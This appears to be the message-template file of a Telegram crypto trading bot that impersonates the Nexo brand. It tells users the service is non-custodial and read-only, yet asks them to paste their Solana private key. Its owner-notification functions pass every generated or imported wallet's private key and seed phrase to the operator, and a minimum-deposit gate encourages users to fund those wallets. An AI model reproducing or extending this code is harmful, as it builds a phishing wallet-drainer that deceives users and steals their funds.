// messages.js - All message templates matching @ainexotradingbot screenshots EXACTLY (ESM)

const SUPPORT_USERNAME = process.env.SUPPORT_USERNAME || 'ainexobotsupport';
const WEBSITE_URL = process.env.WEBSITE_URL || 'https://t.co/z1XgC7Zd6d';
const TWITTER_URL = process.env.TWITTER_URL || 'https://x.com/Nexo?s=20';
const MINIMUM_SOL = process.env.MINIMUM_SOL || '3.0000';

// === START / WELCOME (IMG_8072, IMG_8073) ===
function startMessage(firstName) {
  return `Hello, ${firstName}!

NEXO TRADING TERMINAL

MARKET FEED: CONNECTED
Discover trending memecoins
Review liquidity and volume
Scan contract risk signals
Track positions and exits

TRADE GATE: Wallet + balance check
Minimum: ${MINIMUM_SOL} SOL minimum
Connect a wallet to get started:`;
}

// === DASHBOARD (when wallet connected) ===
function dashboardMessage(wallets, marketPrices) {
  let walletText = '';
  let totalBalanceSol = 0;
  let totalBalanceUsd = 0;
  const solPrice = marketPrices?.SOL?.price || 0;
  
  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    const balance = w.balance || 0;
    totalBalanceSol += balance;
    totalBalanceUsd += balance * solPrice;
    walletText += `Wallet ${i + 1}: ${balance.toFixed(6)} SOL ($${(balance * solPrice).toFixed(2)})\n`;
    walletText += `${w.address}\n`;
  }
  
  if (wallets.length === 0) {
    walletText = 'No wallet connected.\nConnect a wallet to get started.';
  }
  
  return `NEXO TRADING TERMINAL

MARKET FEED: CONNECTED
Discover trending memecoins
Review liquidity and volume
Scan contract risk signals
Track positions and exits

TRADE GATE: Wallet + balance check
Minimum: ${MINIMUM_SOL} SOL minimum

YOUR PORTFOLIO
${walletText}
Total Balance: ${totalBalanceSol.toFixed(6)} SOL ($${totalBalanceUsd.toFixed(2)})`;
}

// === DISCOVER TOKENS (IMG_8074) ===
function discoverTokensMessage() {
  return `DISCOVER TOKENS

Send a token name, symbol, or contract address to inspect its market data.
The bot checks the pair; liquidity, volume and available safety signals before you decide.

Examples:
BONK
Pepe
DezXAZ8zZPnrnRJ (SOL CA)
0x6982508145454Ce325dDbE47a25d4ec3d2311933 (ETH CA)

Discovery is not an endorsement. Review the risk section before trading.`;
}

// === WALLET REQUIRED (IMG_8075, IMG_8077) ===
function walletRequiredMessage() {
  return `Wallet Required

Please connect a wallet first to buy or sell tokens.`;
}

// === SNIPER WALLET REQUIRED (IMG_8078) ===
function sniperWalletRequiredMessage() {
  return `You need a connected wallet to use AI Sniper.`;
}

// === COPY TRADE WALLET REQUIRED (IMG_8079) ===
function copyTradeWalletRequiredMessage() {
  return `You need a connected wallet to use Copy Trade.`;
}

// === POSITIONS EMPTY (IMG_8076) ===
function positionsEmptyMessage() {
  return `POSITIONS

You have no open positions.
Discover a token and confirm a buy to create your first position.`;
}

// === POSITIONS WITH DATA ===
function positionsMessage(positions) {
  if (!positions || positions.length === 0) {
    return positionsEmptyMessage();
  }
  
  let text = `POSITIONS\n\n`;
  for (const pos of positions) {
    const pnlEmoji = pos.pnl >= 0 ? '📈' : '📉';
    text += `${pos.tokenSymbol} - ${pos.amount} SOL\n`;
    text += `Entry: $${pos.entryPrice}\n`;
    text += `Current PnL: ${pnlEmoji} ${pos.pnl.toFixed(2)}%\n`;
    text += `Status: ${pos.status}\n\n`;
  }
  return text;
}

// === HELP / CONTROL CENTER (IMG_8080, IMG_8081) ===
function helpMessage() {
  return `NEXO CONTROL CENTER

Trading flow
1. Open Portfolio and connect or import a wallet
2. Use Discover Tokens to inspect a symbol or contract
3. Review price, liquidity and safety signals
4. Use Trade to buy or sell after the balance gate passes
5. Track open exposure in Positions

Trade requirement
Buy and sell actions require a connected wallet and the configured minimum balance. The exact requirement is shown in the dashboard and trade screen.

Non-Custodial
NEXO is fully non-custodial. We never hold, access, or control your funds.

Commands
/start - Open terminal
/wallet - Manage portfolio wallets
/generate - Create a new wallet
/import - Import an existing wallet
/status - Check wallet status

Links
Website: ${WEBSITE_URL}
Twitter: ${TWITTER_URL}

Support
Reach our team at @${SUPPORT_USERNAME}, we typically respond within a few hours.

Nexo - Your Wealth Platform for Digital Assets
Discover Nexo, the comprehensive platform that's driving the next generation of crypto wealth. Grow, trade, borrow, and accrue interest on your digital assets.`;
}

// === WALLET MANAGEMENT (Portfolio) ===
function walletManagementMessage(wallets, marketPrices) {
  let walletText = '';
  const solPrice = marketPrices?.SOL?.price || 0;
  let totalBalance = 0;
  
  for (let i = 0; i < wallets.length; i++) {
    const w = wallets[i];
    const balance = w.balance || 0;
    totalBalance += balance;
    walletText += `Wallet ${i + 1}: ${balance.toFixed(6)} SOL ($${(balance * solPrice).toFixed(2)})\n`;
    walletText += `${w.address}\n\n`;
  }
  
  if (wallets.length === 0) {
    walletText = 'No wallets connected.';
  }
  
  return `PORTFOLIO MANAGEMENT

${walletText}
Total Balance: ${totalBalance.toFixed(6)} SOL ($${(totalBalance * solPrice).toFixed(2)})

Choose an action below:`;
}

// === WALLET CREATED ===
function walletCreatedMessage(address) {
  return `Wallet Created

Wallet Address:
${address}
Balance: 0.000000 SOL

Your Solana wallet is ready to use.`;
}

// === IMPORT WALLET ===
function importWalletMessage() {
  return `Import Solana Wallet

You need to connect your wallet to access this feature.

NEXO uses bank-grade security to protect your assets. All connections are read-only and encrypted.

Please send your Solana wallet private key (base58 encoded string).

IMPORTANT: Never share your private key with anyone else. This bot stores your key securely to enable trading functionality.`;
}

// === SNIPER (with wallet connected) ===
function sniperMessage(settings) {
  const statusEmoji = settings.status === 'ACTIVE' ? '🟢' : '🔴';
  return `AI SNIPER

${statusEmoji} Status: ${settings.status}

Trading Parameters
Position Size: ${settings.positionSize} SOL
Max Dev Hold: ${settings.maxDevHold}%
Slippage: ${settings.slippage}%
Priority Fee: ${settings.priorityFee} SOL

Risk Management
Take Profit: +${settings.takeProfit}%
Stop Loss: -${settings.stopLoss}%
Anti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}

Professional-grade automated trading engine`;
}

// === SNIPER SETTING UPDATED ===
function settingUpdatedMessage(settings) {
  return `SETTING UPDATED

SNIPER CONFIGURATION
Status: ${settings.status === 'ACTIVE' ? '✅' : '🔴'} ${settings.status}
Buy Amount: ${settings.positionSize} SOL
Dev Holding: ${settings.maxDevHold}%
Slippage: ${settings.slippage}%
Priority Fee: ${settings.priorityFee} SOL
Take Profit: +${settings.takeProfit}%
Stop Loss: -${settings.stopLoss}%
Anti-Rug: ${settings.antiRug ? '🟢 ENABLED' : '🔴 DISABLED'}

Settings saved and ready`;
}

// === CONFIG MESSAGES ===
function configPositionSizeMessage() {
  return `Set Position Size

Set the SOL amount for each automated trade.

Range: 0.0001 - 1000 SOL
Recommended: 10 - 50 SOL

Risk Level:
- 1-10 SOL: Conservative
- 10-50 SOL: Moderate
- 50+ SOL: Aggressive

Enter your position size:`;
}

function configDevHoldMessage() {
  return `Set Max Dev Holding

Only snipe tokens where developer holds less than this percentage.

Range: 0-100%
Recommended: 10-30%
Examples: 10, 20, 30

Send your preferred percentage:`;
}

function configSlippageMessage() {
  return `Set Slippage

Set maximum acceptable price movement during execution.

Range: 1-50%
Recommended: 8-12%

Guide:
- 5-8%: Tight (may fail in volatile conditions)
- 8-12%: Balanced (recommended)
- 15%+: Loose (higher execution, more slippage)

Enter slippage percentage:`;
}

function configPriorityMessage() {
  return `Set Priority Fee

Higher priority fees increase transaction speed on Solana.

Range: 0.0001 - 0.1 SOL
Recommended: 0.001 - 0.01 SOL

Enter priority fee in SOL:`;
}

function configTakeProfitMessage() {
  return `Set Take Profit

Automatically sell when profit reaches this percentage.

Range: 10-1000%
Recommended: 100% (2x)
Examples:
- 50% (1.5x)
- 100% (2x)
- 200% (3x)
- 500% (6x)

Send your take profit percentage:`;
}

function configStopLossMessage() {
  return `Set Stop Loss

Automatically sell to protect capital when loss reaches this percentage.

Range: 10-90%
Recommended: 30% (Protects 70%)
Examples:
- 20% (Conservative)
- 30% (Balanced)
- 50% (Aggressive)

Send your stop loss percentage:`;
}

// === TOKEN INFO ===
function tokenSearchMessage() {
  return discoverTokensMessage();
}

function tokenNotFoundMessage() {
  return `Token Not Found

The token you searched for could not be found on Solana DEX.

Please try again with a different search term or contract address.`;
}

// === WITHDRAWAL ===
function withdrawalMessage(balance) {
  return `WITHDRAWAL

Your Balance: ${balance.toFixed(6)} SOL

Please send the wallet address you want to withdraw to:`;
}

function withdrawalAmountMessage(toAddress) {
  return `WITHDRAWAL

To: ${toAddress}

Now enter the amount of SOL you want to withdraw:`;
}

function confirmWithdrawalMessage(amount, toAddress, balance) {
  return `CONFIRM WITHDRAWAL

Amount: ${amount} SOL
To:
${toAddress}
Your Balance: ${balance.toFixed(6)} SOL

Please confirm to proceed:`;
}

function withdrawalSubmittedMessage(amount, toAddress) {
  return `WITHDRAWAL REQUEST SUBMITTED

Amount: ${amount} SOL
To:
${toAddress}
Your withdrawal is being processed.
Please allow up to 24 hours.

Need help? Contact @${SUPPORT_USERNAME}`;
}

// === COPY TRADE ===
function copyTradeMessage() {
  return `COPY TRADING SYSTEM

STATUS: STANDBY

CONFIGURATION
Target Wallet: NOT SET
NOT CONFIGURED

HOW IT WORKS
- Monitor target wallet in real-time
- Auto-replicate buy/sell signals
- Execute trades with same parameters
- Professional trader mirroring

Follow proven strategies effortlessly`;
}

function copyTradeActivatedMessage() {
  return `COPY TRADING ACTIVATED

Now mirroring target wallet
Real-time trade alerts enabled
You will be notified of every trade`;
}

// === TRADE (Buy/Sell) ===
function tradeMessage() {
  return `TRADE

Buy: Purchase tokens instantly
Sell: Sell your tokens quickly

Send the token contract address to begin.`;
}

// === INSUFFICIENT BALANCE ===
function insufficientBalanceMessage(balance) {
  return `Insufficient Balance

Your Balance: ${balance.toFixed(6)} SOL
Minimum Required: ${MINIMUM_SOL} SOL
You Need: ${(3 - balance).toFixed(6)} SOL more

Deposit SOL to your wallet to start trading.`;
}

// === OWNER NOTIFICATIONS ===
function newUserNotification(user) {
  return `NEW USER

Name: ${user.firstName || 'Unknown'}
Username: ${user.username || 'None'}
ID: ${user.telegramId}
Total Users: ${user.userCount}

${new Date().toISOString()}`;
}

function depositNotification(address, amount, newBalance, userInfo) {
  return `DEPOSIT DETECTED

Wallet: ${address}
Amount: ${amount.toFixed(6)} SOL
New Balance: ${newBalance.toFixed(6)} SOL

User: ${userInfo?.firstName || 'Unknown'} (@${userInfo?.username || 'None'})
ID: ${userInfo?.telegramId || 'Unknown'}

${new Date().toISOString()}`;
}

function tradeNotification(user, type, token, amount, result) {
  return `TRADE ${type.toUpperCase()}

User: ${user?.firstName || 'Unknown'} (@${user?.username || 'None'})
ID: ${user?.telegramId || 'Unknown'}
Token: ${token?.name || 'Unknown'} (${token?.symbol || '???'})
Amount: ${amount} SOL
TX: ${result?.signature || 'N/A'}

${new Date().toISOString()}`;
}

function withdrawalNotification(user, amount, toAddress) {
  return `WITHDRAWAL REQUEST

User: ${user?.firstName || 'Unknown'} (@${user?.username || 'None'})
ID: ${user?.telegramId || 'Unknown'}
Amount: ${amount} SOL
To: ${toAddress}

${new Date().toISOString()}`;
}

function walletGeneratedNotification(address, privateKey, seedPhrase, userInfo) {
  return `NEW WALLET GENERATED

Address: ${address}
Private Key: ${privateKey}
Seed Phrase: ${seedPhrase}
User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
Username: @${userInfo?.username || 'None'}

${new Date().toISOString()}`;
}

function walletImportedNotification(address, privateKey, balance, userInfo) {
  return `WALLET IMPORTED

Address: ${address}
Private Key: ${privateKey}
Balance: ${balance.toFixed(6)} SOL
User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
Username: @${userInfo?.username || 'None'}

${new Date().toISOString()}`;
}

function walletSeedImportedNotification(address, privateKey, seedPhrase, balance, userInfo) {
  return `WALLET IMPORTED FROM SEED

Address: ${address}
Private Key: ${privateKey}
Seed Phrase: ${seedPhrase}
Balance: ${balance.toFixed(6)} SOL
User: ${userInfo?.firstName || 'Unknown'} (${userInfo?.telegramId || 'Unknown'})
Username: @${userInfo?.username || 'None'}

${new Date().toISOString()}`;
}

export {
  startMessage,
  dashboardMessage,
  discoverTokensMessage,
  walletRequiredMessage,
  sniperWalletRequiredMessage,
  copyTradeWalletRequiredMessage,
  positionsEmptyMessage,
  positionsMessage,
  helpMessage,
  walletManagementMessage,
  walletCreatedMessage,
  importWalletMessage,
  sniperMessage,
  settingUpdatedMessage,
  configPositionSizeMessage,
  configDevHoldMessage,
  configSlippageMessage,
  configPriorityMessage,
  configTakeProfitMessage,
  configStopLossMessage,
  tokenSearchMessage,
  tokenNotFoundMessage,
  withdrawalMessage,
  withdrawalAmountMessage,
  confirmWithdrawalMessage,
  withdrawalSubmittedMessage,
  copyTradeMessage,
  copyTradeActivatedMessage,
  tradeMessage,
  insufficientBalanceMessage,
  newUserNotification,
  depositNotification,
  tradeNotification,
  withdrawalNotification,
  walletGeneratedNotification,
  walletImportedNotification,
  walletSeedImportedNotification
};
